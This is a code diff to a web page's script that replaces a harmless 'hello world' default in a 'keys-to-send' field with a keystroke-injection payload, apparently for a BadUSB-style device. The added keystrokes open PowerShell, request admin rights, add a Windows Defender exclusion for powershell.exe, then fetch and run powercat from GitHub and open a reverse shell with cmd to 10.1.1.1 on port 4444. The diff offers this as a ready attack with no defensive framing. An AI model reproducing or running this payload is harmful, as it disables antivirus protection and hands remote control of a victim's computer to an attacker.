@@ -56,13 +56,28 @@
     }
 
     document.addEventListener("DOMContentLoaded", ()=>{
-        document.getElementById("keys-to-send").innerHTML = `hello,
-> GUI DOWN
-> TAB DOWN
-> TAB UP
+        document.getElementById("keys-to-send").innerHTML = `> GUI DOWN
+> R DOWN
+> R UP
 > GUI UP
-> SLEEP 1000
-world!
+> SLEEP 200
+powershell
+> SLEEP 200
+> ENTER DOWN
+> ENTER UP
+> SLEEP 200
+powershell -c "Start-Process powershell -Verb runAs"
+> SLEEP 500
+> ENTER DOWN
+> ENTER UP
+> SLEEP 500
+Set-MpPreference -ExclusionProcess "powershell.exe"
+> ENTER DOWN
+> ENTER UP
+> SLEEP 200
+IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 10.1.1.1 -p 4444 -e cmd
+> ENTER DOWN
+> ENTER UP
 `
     })
 </script>
